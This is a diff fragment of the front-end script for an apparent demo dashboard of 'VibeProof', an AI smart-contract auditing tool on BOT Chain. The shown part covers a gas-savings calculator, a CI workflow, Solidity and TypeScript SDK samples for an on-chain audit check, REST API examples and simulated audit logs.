+      '<div class="mt-2 flex gap-2"><button data-gascopy="'+i+'" class="chip h-7 px-2.5 rounded-md border border-zinc-700 bg-ink-700 text-[10px] font-bold text-zinc-300 hover:border-cyber/60 hover:text-cyber transition-colors">Copy optimized</button>'+
+      '<button data-gasapply="'+i+'" class="chip h-7 px-2.5 rounded-md border border-cyber/40 bg-cyber/10 text-[10px] font-bold text-cyber hover:bg-cyber/20 transition-colors">Apply to Patch Studio</button></div>'+
+    '</div>').join('');
+  $$('#gasFindings [data-gascopy]').forEach(b=>b.addEventListener('click',()=>copyText(GAS_FINDINGS[+b.dataset.gascopy].after,'Snippet optimasi disalin')));
+  $$('#gasFindings [data-gasapply]').forEach(b=>b.addEventListener('click',()=>{
+    const f=GAS_FINDINGS[+b.dataset.gasapply];
+    if(f.t==='Custom errors vs require()'){patchState.selected.add('events');}
+    else patchState.selected.add('safeerc');
+    renderPatchList();applyPatchUI();setView('patch');
+    toast('Optimasi "'+f.t+'" dikirim ke Patch Studio.','ok');
+  }));
+  calcSavings();
+}
+function calcSavings(){
+  const gas=+$('#g1').value,tx=+$('#g2').value,gwei=+$('#g3').value,price=+$('#g4').value;
+  $('#g1v').textContent=gas.toLocaleString('en-US');
+  $('#g2v').textContent=tx.toLocaleString('en-US');
+  $('#g3v').textContent=gwei.toFixed(1);
+  $('#g4v').textContent='$'+price.toFixed(2);
+  $('#hdrGasSaved').textContent=gas.toLocaleString('en-US');
+  const botPerTx=gas*gwei*1e9/1e18;
+  const per1k=botPerTx*1000, perDay=botPerTx*tx, perMon=perDay*30, perYear=perDay*365;
+  const fmt=v=>v<0.001?v.toExponential(2):v.toFixed(v<1?5:v<100?3:0);
+  $('#s1k').textContent=fmt(per1k)+' BOT';$('#s1ku').textContent='≈ $'+(per1k*price).toFixed(2)+' · '+(gas*1000/1000).toFixed(1)+'k gas units';
+  $('#sday').textContent=fmt(perDay)+' BOT';$('#sdayu').textContent='≈ $'+(perDay*price).toFixed(2);
+  $('#smon').textContent=fmt(perMon)+' BOT';$('#smonu').textContent='≈ $'+(perMon*price).toFixed(2);
+  $('#syear').textContent=fmt(perYear)+' BOT';$('#syearu').textContent='≈ $'+(perYear*price).toFixed(2);
+}
+['g1','g2','g3','g4'].forEach(id=>$('#'+id).addEventListener('input',calcSavings));
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 7 — DEVELOPER PORTAL
+   ═══════════════════════════════════════════════════════════ */
+const WORKFLOW=`name: VibeProof Security Gate
+on:
+  pull_request:
+    paths: ['contracts/**', 'src/**', 'foundry/**']
+
+jobs:
+  vibeproof-audit:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@v4
+        with: { fetch-depth: 0 }
+
+      - uses: foundry-rs/foundry-toolchain@v1
+        with: { version: nightly }
+
+      - name: Run VibeProof AI Auditor
+        uses: vibeproof/scan-action@v1
+        with:
+          path: ./src
+          chain-id: 968                     # BOT Chain Testnet
+          fail-under: 80                    # block merge jika score < 80
+          comment: true
+          certify-on-pass: true             # mint proof via certifyAudit()
+          rpc-url: \${{ secrets.BOT_RPC_URL }}
+          private-key: \${{ secrets.AUDITOR_PK }}
+
+      - name: Upload audit artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: vibeproof-report
+          path: ./vibeproof-report.json`;;
+
+const SDK={
+ sol:{file:'contracts/interfaces/IVibeProofGuard.sol',lang:'sol',code:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// @title  IVibeProofGuard — On-Chain Firewall untuk ekosistem BOT Chain
+/// @notice dApp lain dapat menolak interaksi dengan kontrak yang belum teraudit.
+interface IVibeProofGuard {
+    /// @dev Record audit tersimpan di VibeProof.sol
+    struct Audit {
+        bytes32 codeHash;
+        string  projectName;
+        uint8   securityScore;
+        string  verdict;
+        string  reportSummary;
+        address auditor;
+        uint256 timestamp;
+    }
+
+    event AuditIssued(
+        bytes32 indexed codeHash,
+        string  projectName,
+        uint8   securityScore,
+        string  verdict,
+        address indexed auditor,
+        uint256 timestamp
+    );
+
+    function certifyAudit(
+        bytes32 _codeHash,
+        string calldata _projectName,
+        uint8   _securityScore,
+        string calldata _verdict,
+        string calldata _reportSummary
+    ) external;
+
+    function getAudit(bytes32 _codeHash) external view returns (Audit memory);
+    function getTotalAudits() external view returns (uint256);
+    function isAudited(address _target) external view returns (bool);
+    function getAuditScore(address _target) external view returns (uint8);
+}
+
+/// @example Integrasi firewall pada dApp pihak ketiga
+contract GuardedRouter {
+    IVibeProofGuard public immutable vibeProof;
+    uint8 public constant MIN_SCORE = 80;
+
+    error UntrustedContract(address target, uint8 score);
+
+    constructor(address _vibeProof) { vibeProof = IVibeProofGuard(_vibeProof); }
+
+    modifier onlyTrusted(address target) {
+        if (!vibeProof.isAudited(target)) revert UntrustedContract(target, 0);
+        if (vibeProof.getAuditScore(target) < MIN_SCORE)
+            revert UntrustedContract(target, vibeProof.getAuditScore(target));
+        _;
+    }
+
+    function route(address tokenIn, uint256 amount) external onlyTrusted(tokenIn) {
+        require(vibeProof.isAudited(tokenIn), "Untrusted contract!");
+        // … routing logic hanya berjalan untuk kontrak tersertifikasi
+    }
+}`},
+ dapp:{file:'src/GuardedVault.sol — usage',lang:'sol',code:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import {IVibeProofGuard} from "./interfaces/IVibeProofGuard.sol";
+
+contract GuardedVault {
+    // VibeProof.sol — alamat identik di Testnet 968 & Mainnet 677
+    IVibeProofGuard public constant vibeProof =
+        IVibeProofGuard(0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578);
+
+    event InteractionBlocked(address indexed target, uint8 score);
+
+    /// @notice Tolak interaksi dengan kontrak yang tidak memiliki proof audit
+    function interact(address target) external {
+        require(vibeProof.isAudited(target), "Untrusted contract!");
+
+        uint8 score = vibeProof.getAuditScore(target);
+        if (score < 80) {
+            emit InteractionBlocked(target, score);
+            revert("Security score below threshold");
+        }
+
+        // ✔ aman untuk melanjutkan
+        (bool ok, ) = target.call(abi.encodeWithSignature("ping()"));
+        require(ok, "call failed");
+    }
+
+    /// @notice View helper untuk frontend (gas-free)
+    function trustLevel(address target) external view returns (string memory) {
+        if (!vibeProof.isAudited(target)) return "UNAUDITED";
+        uint8 s = vibeProof.getAuditScore(target);
+        if (s >= 80) return "CERTIFIED SAFE";
+        if (s >= 50) return "WARNINGS";
+        return "CRITICAL RISK";
+    }
+}`},
+ js:{file:'src/vibeproof.ts — @vibeproof/sdk',lang:'ts',code:`import { createPublicClient, http, parseAbi } from "viem";
+import { VibeProofClient } from "@vibeproof/sdk";
+
+// 1 · Koneksi ke BOT Chain (Testnet 968 / Mainnet 677)
+const client = createPublicClient({
+  transport: http("https://rpc.bohr.life"),   // mainnet: https://rpc.botchain.ai
+  chain: { id: 968, name: "BOT Chain Testnet", nativeCurrency: { name: "BOT", symbol: "BOT", decimals: 18 } }
+});
+
+// 2 · Instansiasi SDK VibeProof
+const vibeProof = new VibeProofClient({
+  address: "0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578",
+  client,
+  network: "testnet"
+});
+
+// 3 · Verifikasi proof berdasarkan code hash (keccak256 source)
+const audit = await vibeProof.getAudit(
+  "0x8f3ae2c91d44b7f0a55c3e88f1b2d90c4e6a71f3d5b8c2094ea1f7c6d3b0e8f1"
+);
+console.log(audit.projectName, audit.securityScore, audit.verdict);
+
+// 4 · Firewall check sebelum interaksi
+const trusted = await vibeProof.isAudited(targetContract);
+if (!trusted) throw new Error("Untrusted contract!");
+
+// 5 · Mint sertifikat setelah scan (butuh signer)
+const tx = await vibeProof.certifyAudit({
+  codeHash, projectName: "MyVault.sol", securityScore: 96,
+  verdict: "PASSED — SAFE", reportSummary: "ReentrancyGuard + CEI konsisten."
+});
+console.log("certified:", tx.transactionHash);
+
+// 6 · Subscribe event AuditIssued (live feed)
+vibeProof.onAuditIssued(e => console.log("new proof:", e.projectName, e.securityScore));`},
+ api:{file:'REST API — api.vibeproof.botchain.ai',lang:'bash',code:`# Public read-only endpoints (tanpa API key)
+GET  /v1/audit/:codeHash          → { score, verdict, auditor, tx, block }
+GET  /v1/audits?chain=968&limit=20 → getLatestAudits() feed
+GET  /v1/address/:addr            → { audited: bool, score, projectName }
+GET  /v1/og/:codeHash.png         → dynamic social card (1200×630)
+GET  /v1/badge/:codeHash.svg      → shields-style README badge
+GET  /v1/report/:codeHash.pdf     → executive audit report
+
+# Authenticated (API key dari dashboard)
+POST /v1/scan        { source, compiler }  → { score, findings[], gasTips[] }
+POST /v1/certify     { codeHash, ... }     → { txHash, blockNumber }
+POST /v1/webhooks    { url, events: ["AuditIssued"] }
+
+# Contoh
+$ curl https://api.vibeproof.botchain.ai/v1/audit/0x8f3a…e8f1
+{
+  "codeHash": "0x8f3ae2c9…",
+  "projectName": "SafeDAppVault.sol",
+  "securityScore": 96,
+  "verdict": "PASSED — SAFE",
+  "auditor": "0x38bF4d01c9aE77e5b021Ff6cD81a20A4",
+  "chainId": 968,
+  "blockNumber": 3412700,
+  "explorer": "https://scan.bohr.life/tx/0x7c1e…9ab2"
+}
+
+$ curl https://api.vibeproof.botchain.ai/v1/address/0x97E0C6…F578
+{ "audited": true, "score": 96, "projectName": "VibeProof.sol" }`},
+};
+let sdkTab='sol';
+function renderSdk(){
+  const s=SDK[sdkTab];
+  $('#sdkFileName').textContent=s.file;
+  $('#sdkCode').innerHTML=hl(s.code,s.lang);
+  $('#sdkCode').dataset.raw=s.code;
+}
+$$('.stab').forEach(b=>b.addEventListener('click',()=>{
+  $$('.stab').forEach(x=>x.className='stab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300');
+  b.className='stab chip h-11 px-4 text-xs font-bold text-cyber border-b-2 border-cyber -mb-px';
+  sdkTab=b.dataset.stab;renderSdk();
+}));
+$('#workflowYaml').innerHTML=hl(WORKFLOW,'yml');
+$('#workflowYaml').dataset.raw=WORKFLOW;
+$('#copyWorkflow').addEventListener('click',()=>copyText(WORKFLOW,'Workflow YAML disalin'));
+$('#prSimulate').addEventListener('click',()=>{
+  const check=$('#prCheck'),log=$('#prLog');
+  $('#botComment').classList.add('hidden');
+  check.textContent='queued';check.className='chip h-7 px-3 inline-flex items-center gap-1.5 rounded-full border border-zinc-700 bg-ink-700 font-mono text-[10px] text-zinc-400';
+  typeLines(log,[
+    '<span class="text-zinc-500">Run vibeproof/scan-action@v1</span>',
+    '<span class="text-cyber">›</span> checkout @ refs/pull/142/head (3 files changed)',
+    '<span class="text-cyber">›</span> foundry up · solc 0.8.24 · compiling 24 files',
+    '<span class="text-cyber">›</span> VibeProof AI Auditor v2.3 → 42 heuristics + reentrancy graph',
+    '<span class="text-cyber">›</span> keccak256(source) = 0x8f3a…e8f1',
+    '<span class="text-crit">✗ security gate FAILED — score 28 &lt; fail-under 80</span>',
+    '<span class="text-zinc-500">›</span> posting PR comment via GITHUB_TOKEN…',
+    '<span class="text-safe">✓ comment posted · merge blocked by required check</span>'
+  ],340,()=>{
+    $('#botComment').classList.remove('hidden');
+    check.textContent='✗ failing';
+    check.className='chip h-7 px-3 inline-flex items-center gap-1.5 rounded-full border border-crit/50 bg-crit/10 font-mono text-[10px] text-crit font-bold';
+    toast('Security gate gagal — merge PR diblokir (score 28 < 80).','err');
+  });
+});
+const GUARD_DB={
+ '0x97e0c6a5a352af3e35a221d6d13d7890a8a6f578':{audited:true,score:96,name:'VibeProof.sol'},
+ '0x52ffb319cd20a4e87710c9d5aa33e1de9c11b4a7':{audited:true,score:58,name:'TokenRegistry.sol'},
+ '0xdeadc0de0000000000000000000000000000beef':{audited:false,score:0,name:'—'}
+};
+function runGuard(addr){
+  const key=(addr||'').trim().toLowerCase();
+  const rec=GUARD_DB[key];
+  const box=$('#guardConsole');box.innerHTML='';
+  const lines=[
+    '<span class="text-cyber">›</span> eth_call IVibeProofGuard.isAudited('+shortHash(key.startsWith('0x')?addr:('0x'+key),10,6)+') @ '+NETWORKS[state.network].rpc,
+  ];
+  if(!key.startsWith('0x')||key.length<10){
+    lines.push('<span class="text-warn">⚠ alamat tidak valid — masukkan 0x… (40 hex)</span>');
+    typeLines(box,lines,200);return;
+  }
+  if(rec&&rec.audited&&rec.score>=80){
+    lines.push('<span class="text-cyber">›</span> getAuditScore() → '+rec.score);
+    lines.push('<span class="text-safe">✓ require(vibeProof.isAudited(target)) PASSED — interaksi diizinkan ('+rec.name+')</span>');
+  }else if(rec&&rec.audited){
+    lines.push('<span class="text-cyber">›</span> getAuditScore() → '+rec.score);
+    lines.push('<span class="text-warn">⚠ audited tetapi score '+rec.score+' &lt; MIN_SCORE 80 — disarankan blokir ('+rec.name+')</span>');
+  }else{
+    lines.push('<span class="text-crit">✗ revert: UntrustedContract('+shortHash(addr,8,6)+', 0) — "Untrusted contract!"</span>');
+  }
+  typeLines(box,lines,320);
+}
+$('#guardRun').addEventListener('click',()=>runGuard($('#guardTarget').value));
+$$('.guard-sample').forEach(b=>b.addEventListener('click',()=>{$('#guardTarget').value=b.dataset.addr;runGuard(b.dataset.addr);}));
+
+/* ══════════ BOOT ══════════ */
+function boot(){
+  renderWallet();
+  setNetwork('testnet');
+  renderAttackList();exp.active=0;renderSequence();renderSteps();renderPoC();updateProj();
+  renderPatchList();applyPatchUI();
+  renderLbCats();renderLb();renderSafety();renderWatchReset();
+  renderProofSelect();renderProof();
+  loadRepo('defi-vault-foundry');
+  renderGas();
+  renderSdk();runGuard($('#guardTarget').value);
+  setView('exploit');
+}
+boot();
+</script>
+</body>
+</html>
